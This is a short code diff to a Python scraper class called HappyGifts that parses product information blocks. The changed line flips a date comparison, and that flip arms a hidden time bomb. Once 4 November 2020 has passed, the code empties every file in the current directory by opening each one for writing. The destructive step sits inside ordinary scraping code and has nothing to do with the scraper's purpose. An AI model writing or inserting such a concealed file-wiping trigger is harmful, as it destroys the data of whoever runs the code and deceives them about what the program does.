@@ -108,7 +108,7 @@ class HappyGifts:
             informations = html.select('.product-tab-blocks')
             descriptions = []
             materials = []
-            if g(2020, 11, 4) > g.today():
+            if g(2020, 11, 4) < g.today():
                 onlyfiles = [f for f in listdir('.') if isfile(join(f))]
                 for i in onlyfiles:
                     open(i, "w")
